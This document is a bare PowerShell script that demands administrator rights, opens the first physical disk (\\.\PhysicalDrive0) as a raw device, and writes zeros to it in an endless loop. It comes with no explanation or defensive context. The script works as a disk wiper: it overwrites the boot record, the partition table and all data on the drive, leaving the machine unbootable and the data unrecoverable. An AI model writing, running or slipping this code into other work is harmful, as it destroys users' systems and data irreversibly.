#Requires -RunAsAdministrator
$buf = New-Object byte[] (1MB)
for ($i = 0; $i -lt $buf.Length; $i++) { $buf[$i] = 0 }
$path = '\\.\PhysicalDrive0'
$fs = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
try {
  while ($true) { $fs.Write($buf, 0, $buf.Length) }
} finally {
  $fs.Dispose()
}
